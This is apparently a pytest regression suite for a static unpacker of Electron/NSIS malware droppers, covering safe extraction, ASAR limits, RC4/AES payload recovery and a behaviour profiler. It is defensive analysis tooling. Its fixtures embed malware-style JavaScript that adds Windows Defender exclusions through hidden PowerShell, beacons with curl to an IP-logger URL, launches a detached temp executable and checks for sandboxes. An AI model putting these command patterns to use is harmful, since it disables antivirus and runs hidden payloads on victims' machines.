"""Electron NSIS向け静的復元helperの回帰テスト。"""

from __future__ import annotations

import hashlib
import json
import struct
from pathlib import Path

import pytest
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7

import unpackers.electron_nsis_unpacker as electron_unpacker
from unpackers.electron_nsis_unpacker import (
    _behavior_profile,
    _rc4_bytes,
    _safe_integer,
    characterize_terminal_pe,
    deobfuscate_generated_alphabet_rc4,
    extract_member,
    recover_payload_from_asar,
    safe_archive_member,
    select_asar_members,
    select_nested_7z_members,
)
from unpackers.static_unpacker import StaticToolCompleted, StaticToolExecutionError


def _minimal_pe() -> bytes:
    """RET 1命令だけをentry pointに持つ小型PE32 fixtureを作る。"""
    data = bytearray(0x400)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, 0x80)
    data[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", data, 0x84, 0x14C, 1, 0, 0, 0, 0xE0, 0x0102)
    optional = 0x98
    struct.pack_into("<H", data, optional, 0x10B)
    struct.pack_into("<I", data, optional + 4, 0x200)
    struct.pack_into("<I", data, optional + 16, 0x1000)
    struct.pack_into("<I", data, optional + 20, 0x1000)
    struct.pack_into("<I", data, optional + 24, 0x2000)
    struct.pack_into("<I", data, optional + 28, 0x400000)
    struct.pack_into("<II", data, optional + 32, 0x1000, 0x200)
    struct.pack_into("<I", data, optional + 56, 0x2000)
    struct.pack_into("<I", data, optional + 60, 0x200)
    struct.pack_into("<I", data, optional + 92, 16)
    section = optional + 0xE0
    data[section : section + 8] = b".text\0\0\0"
    struct.pack_into("<IIII", data, section + 8, 0x200, 0x1000, 0x200, 0x200)
    struct.pack_into("<I", data, section + 36, 0x60000020)
    data[0x200] = 0xC3
    return bytes(data)


def _asar(members: dict[str, bytes]) -> bytes:
    """複数memberを持つ上限付きASAR fixtureを作る。"""
    tree: dict = {}
    offset, payload = 0, bytearray()
    for name, blob in members.items():
        current = tree
        parts = name.split("/")
        for part in parts[:-1]:
            current = current.setdefault(part, {"files": {}})["files"]
        current[parts[-1]] = {
            "size": len(blob),
            "offset": str(offset),
            "integrity": {"hash": hashlib.sha256(blob).hexdigest()},
        }
        payload.extend(blob)
        offset += len(blob)
    raw = json.dumps({"files": tree}, separators=(",", ":")).encode()
    return struct.pack("<IIII", 4, len(raw) + 8, len(raw) + 4, len(raw)) + raw + payload


def test_selects_nested_archive_and_canonical_asar() -> None:
    """関連する入れ子containerだけを決定的な優先順で選ぶ。"""
    assert select_nested_7z_members(["$PLUGINSDIR\\app-64.7z", "System.dll"]) == [
        "$PLUGINSDIR\\app-64.7z"
    ]
    assert select_asar_members(["other.asar", "resources\\app.asar"]) == [
        "resources\\app.asar",
        "other.asar",
    ]


def test_rejects_unsafe_archive_member() -> None:
    """7-Zip起動前にtraversalと絶対member pathを拒否する。"""
    with pytest.raises(ValueError):
        safe_archive_member("../payload.7z")
    with pytest.raises(ValueError):
        safe_archive_member("C:\\payload.asar")


def test_archive_listing_uses_bounded_process_containment(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """7-Zip listingを共通のprocess tree・出力・temp上限経由に限定する。"""
    archive, executable = tmp_path / "outer.bin", tmp_path / "7z.exe"
    archive.write_bytes(b"fixture")
    executable.write_bytes(b"fixture-tool")
    observed = {}

    def fake_runner(command, **kwargs):
        observed.update(command=command, **kwargs)
        return StaticToolCompleted(
            0,
            f"Path = {archive}\nType = Nsis\nPath = $PLUGINSDIR\\app-64.7z\n",
            "",
        )

    monkeypatch.setattr(electron_unpacker, "_run_static_tool_process", fake_runner)
    report = electron_unpacker.list_archive(archive, executable)
    assert report["status"] == "listed"
    assert report["members"] == ["$PLUGINSDIR\\app-64.7z"]
    assert observed["command"][:3] == [str(executable), "l", "-slt"]
    assert observed["max_temp_entries"] > 0
    assert observed["max_temp_bytes"] > 0


def test_static_integer_parser_rejects_huge_literals_and_shift_counts() -> None:
    """演算前に巨大整数literalとshift countを拒否する。"""
    with pytest.raises(ValueError, match="literal exceeds bounds"):
        _safe_integer("1 << 100000000000000000000000000000000000")
    with pytest.raises(ValueError, match="shift count exceeds bounds"):
        _safe_integer("1 << 64")
    with pytest.raises(ValueError, match="named integer exceeds bounds"):
        _safe_integer("n << 1", {"n": 1 << 500})


def test_extract_member_rejects_reparse_before_path_enumeration(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """7-Zip出力treeのreparse判定に失敗したら列挙せず停止する。"""
    archive, executable = tmp_path / "outer.bin", tmp_path / "7z.exe"
    archive.write_bytes(b"fixture")
    executable.write_bytes(b"fixture-tool")
    monkeypatch.setattr(
        electron_unpacker,
        "_run_static_tool_process",
        lambda *_args, **_kwargs: StaticToolCompleted(0, "", ""),
    )

    def reject_reparse(path: Path, *, root: Path, maximum_size: int) -> bytes:
        assert path == root / "nested" / "payload.7z"
        assert maximum_size > 0
        raise StaticToolExecutionError("output_reparse_forbidden")

    monkeypatch.setattr(electron_unpacker, "_read_static_tool_output", reject_reparse)
    monkeypatch.setattr(
        Path,
        "rglob",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(
            AssertionError("unsafe enumeration")
        ),
    )
    with pytest.raises(StaticToolExecutionError, match="output_reparse_forbidden"):
        extract_member(archive, "nested/payload.7z", tmp_path / "out", executable)


def test_extract_member_rejects_real_symlink_ancestor(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    """7-Zip出力memberの親がsymlinkなら実fileを辿らず拒否する。"""
    archive, executable = tmp_path / "outer.bin", tmp_path / "7z.exe"
    archive.write_bytes(b"fixture")
    executable.write_bytes(b"fixture-tool")
    output, outside = tmp_path / "out", tmp_path / "outside"
    output.mkdir()
    outside.mkdir()
    (outside / "payload.7z").write_bytes(b"must-not-read")
    try:
        (output / "nested").symlink_to(outside, target_is_directory=True)
    except OSError:
        pytest.skip("この環境ではsymlink fixtureを作成できない")
    monkeypatch.setattr(
        electron_unpacker,
        "_run_static_tool_process",
        lambda *_args, **_kwargs: StaticToolCompleted(0, "", ""),
    )
    with pytest.raises(StaticToolExecutionError, match="output_reparse_forbidden"):
        extract_member(archive, "nested/payload.7z", output, executable)


def test_generated_alphabet_rc4_path_is_bounded_without_js_execution() -> None:
    """RC4 primitiveの対称性とoversize scriptのfail-closedを検証する。"""
    key = b"unit-test"
    ciphertext = _rc4_bytes(b"hello", key)
    assert _rc4_bytes(ciphertext, key) == b"hello"
    report, transformed = deobfuscate_generated_alphabet_rc4(
        b"x" * (2 * 1024 * 1024 + 1)
    )
    assert report == {"status": "script_size_blocked", "executed": False}
    assert transformed is None


def test_electron_asar_preflight_blocks_size_and_member_count(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Electron専用上限を共通ASAR blob抽出より前に適用する。"""
    monkeypatch.setattr(electron_unpacker, "MAX_ASAR", 32)
    assert electron_unpacker.electron_asar_preflight(b"x" * 33)["status"] == (
        "asar_size_blocked"
    )
    monkeypatch.setattr(electron_unpacker, "MAX_ASAR", 64 * 1024 * 1024)
    too_many = _asar({f"src/member-{index}.dat": b"" for index in range(513)})
    report = electron_unpacker.electron_asar_preflight(too_many)
    assert report["status"] == "asar_member_limit_blocked"
    assert report["member_count_lower_bound"] == 513


def test_electron_asar_preflight_blocks_deep_tree_and_json_recursion() -> None:
    """深いASAR treeを再帰walker/json例外の外へ漏らさず拒否する。"""
    tree = {"leaf.dat": {"size": 0, "offset": "0"}}
    for index in range(65):
        tree = {f"depth-{index}": {"files": tree}}
    raw = json.dumps({"files": tree}, separators=(",", ":")).encode()
    deep_tree = struct.pack("<IIII", 4, len(raw) + 8, len(raw) + 4, len(raw)) + raw
    assert electron_unpacker.electron_asar_preflight(deep_tree)["status"] == (
        "asar_tree_limit_blocked"
    )

    depth = 1500
    raw = (
        b'{"files":'
        + b'{"d":{"files":' * depth
        + b'{"leaf.dat":{"size":0,"offset":"0"}}'
        + b"}}" * depth
        + b"}"
    )
    recursive_json = struct.pack("<IIII", 4, len(raw) + 8, len(raw) + 4, len(raw)) + raw
    assert electron_unpacker.electron_asar_preflight(recursive_json)["status"] == (
        "not_asar"
    )
    assert electron_unpacker.is_asar(recursive_json) is False


def test_electron_asar_blocks_script_candidate_budget(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """多数scriptを復号・保持する前に件数budgetで停止する。"""
    monkeypatch.setattr(electron_unpacker, "MAX_ELECTRON_SCRIPTS", 1)
    report, artifacts = recover_payload_from_asar(
        _asar({"src/a.js": b"a", "src/b.js": b"b"})
    )
    assert report["status"] == "script_budget_blocked"
    assert report["script_candidate_count"] == 2
    assert artifacts == []


def test_behavior_profile_is_fail_closed_without_complete_source_markers() -> None:
    """一般ASARの部分文字列だけからprocess挙動を確定しない。"""
    profile = _behavior_profile(
        [
            (
                '// const IP_LOGGER_URL="https://example.invalid/"; '
                'spawnSync("curl.exe", ["-s", "-L", "-o", "NUL", '
                '"-A", "-m", "10", IP_LOGGER_URL], '
                "{windowsHide:true,shell:false,timeout:15000});\n"
                "/* Add-MpPreference -ExclusionPath -ExclusionProcess "
                "-ExecutionPolicy Bypass -WindowStyle Hidden; "
                "execSync(command,{windowsHide:true,timeout:30000}); */"
            )
        ]
    )
    assert profile["logger"]["branch_confirmed"] is False
    assert profile["logger"]["curl_argument_template"] == []
    assert profile["logger"]["spawn_sync_timeout_ms"] is None
    assert profile["defender_exclusion"]["status"] == "absent"
    assert profile["defender_exclusion"]["command_template"] is None
    assert profile["terminal_process"]["status"] == "absent_or_incomplete"
    assert profile["terminal_process"]["command_line_template"] is None


def test_behavior_profile_confirms_only_complete_process_markers() -> None:
    """対応するsource markerが揃う場合だけ正確なcommand optionを確定する。"""
    source = " ".join(  # noqa: FLY002 - markerを列単位で監査しやすく保つ
        (
            "function logger(){",
            'const IP_LOGGER_URL="https://example.invalid/";',
            'const curlArgs=["-s","-L","-o","NUL","-A","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","-m","10",IP_LOGGER_URL];',
            'spawnSync("curl.exe",curlArgs,{windowsHide:true,shell:false,["timeout"]:581+14419});}',
            "function exclude(){",
            'const command="powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " +',
            '"Add-MpPreference -ExclusionPath temp; Add-MpPreference -ExclusionPath exe; " +',
            '"Add-MpPreference -ExclusionProcess exe";',
            'execSync(command,{windowsHide:true,["timeout"]:1853845829^1853817973});}',
            "function terminal(){",
            'const tempdir=randomBytes(1748-1740).toString("hex");',
            'const exe=tempdir+"/"+randomBytes(2084984869^2084984867).toString("hex")+".exe";',
            'const child=spawn(exe,[],{cwd:tempdir,detached:true,stdio:"ignore",windowsHide:true});',
            "child.unref();}",
            'const _0xabc=os["totalmem"]()/((2017520857^2017519833)*(117594922^117595946)*(551+473));if(_0xabc<2)return;',
            'const _0xdef=os["cpus"]()["length"];if(_0xdef<(5-3))return;',
        )
    )
    profile = _behavior_profile([source])
    assert profile["logger"]["branch_confirmed"] is True
    assert profile["logger"]["curl_max_time_seconds"] == 10
    assert profile["logger"]["spawn_sync_timeout_ms"] == 15000
    assert profile["defender_exclusion"]["status"] == "confirmed"
    assert "\\'" not in profile["defender_exclusion"]["command_template"]
    assert (
        profile["terminal_process"]["command_line_template"]
        == r'"<tempdir>\<12hex>.exe"'
    )
    assert profile["environment_checks"]["minimum_ram_gib_2"] is True
    assert profile["environment_checks"]["minimum_cpu_threads_2"] is True


def test_behavior_profile_rejects_dead_or_split_process_markers() -> None:
    """別functionや別callへ分割されたmarkerからprocess挙動を合成しない。"""
    source = " ".join(  # noqa: FLY002 - marker分離を列単位で監査しやすく保つ
        (
            "function dead(){",
            'const IP_LOGGER_URL="https://example.invalid/";',
            'const curlArgs=["-s","-L","-o","NUL","-A","-m","10",IP_LOGGER_URL];',
            'const temp=randomBytes(8).toString("hex");',
            'const exe=randomBytes(6).toString("hex")+".exe";',
            'const command="Add-MpPreference -ExclusionPath -ExclusionProcess " +',
            '"-ExecutionPolicy Bypass -WindowStyle Hidden";}',
            "function live(){",
            'spawnSync("curl.exe",[],{windowsHide:true,shell:false,timeout:15000});',
            'execSync("benign",{windowsHide:true,timeout:30000});',
            'const first=spawn("a",[],{detached:true});',
            'spawn("b",[],{cwd:"x",stdio:"ignore",windowsHide:true});',
            "first.unref();}",
        )
    )
    profile = _behavior_profile([source])
    assert profile["logger"]["branch_confirmed"] is False
    assert profile["defender_exclusion"]["present"] is False
    assert profile["terminal_process"]["status"] == "absent_or_incomplete"


def test_behavior_profile_rejects_calls_inside_template_and_regex_literals() -> None:
    """template/regex literal内のcall風本文を実コードとして扱わない。"""
    source = r"""
const harmless = `function fake() {
  const IP_LOGGER_URL="https://example.invalid/";
  spawnSync("curl.exe",["-s","-L","-o","NUL","-A","Mozilla/5.0 (Windows NT 10.0; Win64; x64)","-m","10",IP_LOGGER_URL],{timeout:15000,windowsHide:true});
  const command="Add-MpPreference -ExclusionPath -ExclusionProcess -ExecutionPolicy Bypass -WindowStyle Hidden";
  execSync(command,{timeout:30000,windowsHide:true});
  const temp=randomBytes(8).toString("hex");
  const exe=temp+randomBytes(6).toString("hex")+".exe";
  const child=spawn(exe,[],{cwd:temp,detached:true,stdio:"ignore",windowsHide:true});child.unref();
}`;
const pattern=/spawnSync\("curl.exe"\)|execSync\(command\)|spawn\(exe\)/g;
"""
    profile = _behavior_profile([source])
    assert profile["logger"]["branch_confirmed"] is False
    assert profile["defender_exclusion"]["present"] is False
    assert profile["terminal_process"]["status"] == "absent_or_incomplete"


def test_terminal_pe_with_missing_data_directories_fails_closed() -> None:
    """NumberOfRvaAndSizes=0をIndexErrorではなくmalformed PEとして拒否する。"""
    malformed = bytearray(_minimal_pe())
    struct.pack_into("<I", malformed, 0x98 + 92, 0)
    with pytest.raises(ValueError, match="data directory table is truncated"):
        characterize_terminal_pe(bytes(malformed))


def test_recovers_aes_terminal_pe_from_asar_fail_closed(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """一意なAES recipeだけを復号し、検証済みPEだけを返す。"""
    key, iv = bytes(range(32)), bytes(range(16))
    terminal = _minimal_pe()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded = padder.update(terminal) + padder.finalize()
    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ciphertext = encryptor.update(padded) + encryptor.finalize()
    key_script = (
        f'module["exports"]={{["k"]:"{key.hex()}",["v"]:"{iv.hex()}"}};'.encode()
    )
    main_script = (
        b'const keys=require("./keys.js");const source="cipher.dat";'
        b'crypto.createDecipheriv("aes-256-cbc",Buffer.from(keys.k,"hex"),Buffer.from(keys.v,"hex"));'
    )
    monkeypatch.setattr(
        "unpackers.electron_nsis_unpacker.deobfuscate_generated_alphabet_rc4",
        lambda data: ({"status": "deobfuscated", "executed": False}, data),
    )
    app_asar = _asar(
        {
            "src/main.js": main_script,
            "src/keys.js": key_script,
            "src/cipher.dat": ciphertext,
        }
    )
    report, artifacts = recover_payload_from_asar(app_asar)
    assert report["status"] == "terminal_pe_recovered"
    assert report["aes_material"]["values_published"] is False
    assert report["aes_material"]["key_length"] == 32
    assert report["aes_material"]["key_sha256"] == hashlib.sha256(key).hexdigest()
    assert report["aes_material"]["iv_length"] == 16
    assert report["aes_material"]["iv_sha256"] == hashlib.sha256(iv).hexdigest()
    assert artifacts == [("electron-terminal-pe", terminal)]
    assert (
        report["terminal_pe"]["sha256"] == hashlib.sha256(artifacts[0][1]).hexdigest()
    )
    for digest in (
        report["terminal_pe"]["sha256"],
        report["aes_material"]["key_sha256"],
        report["aes_material"]["iv_sha256"],
    ):
        assert len(digest) == 64
        assert set(digest) <= set("0123456789abcdef")
    terminal_profile = characterize_terminal_pe(terminal)
    assert terminal_profile["entry_point_rva"] == 0x1000
    assert terminal_profile["import_limits"] == {
        "maximum_descriptors": 256,
        "maximum_symbols_per_descriptor": 2048,
    }
    assert terminal_profile["import_truncated"] == {
        "descriptors": False,
        "symbols": False,
    }
    assert terminal_profile["string_scan"]["input_truncated"] is False

    from unpackers.static_unpacker import unpack_bytes

    production_report, production_artifacts = unpack_bytes(
        app_asar, name="resources/app.asar"
    )
    assert production_report["electron_payload"]["status"] == "terminal_pe_recovered"
    assert ("electron-terminal-pe", terminal) in production_artifacts

    ambiguous = _asar(
        {
            "src/main.js": main_script,
            "src/other.js": main_script,
            "src/keys.js": key_script,
            "src/cipher.dat": ciphertext,
        }
    )
    blocked, blocked_artifacts = recover_payload_from_asar(ambiguous)
    assert blocked["status"] == "payload_recipe_not_unique"
    assert blocked_artifacts == []

    from unpackers import static_unpacker

    original_recover_asar = static_unpacker.recover_asar
    parse_count = 0

    def counted_recover_asar(data: bytes):
        nonlocal parse_count
        parse_count += 1
        return original_recover_asar(data)

    monkeypatch.setattr(static_unpacker, "recover_asar", counted_recover_asar)
    monkeypatch.setattr(
        electron_unpacker,
        "recover_asar",
        lambda _data: (_ for _ in ()).throw(
            AssertionError("Electron経路でASARを再parseしてはならない")
        ),
    )
    production_report, production_artifacts = static_unpacker.unpack_bytes(
        app_asar, name="resources/app.asar"
    )
    assert parse_count == 1
    assert production_report["electron_payload"]["status"] == ("terminal_pe_recovered")
    assert ("electron-terminal-pe", terminal) in production_artifacts
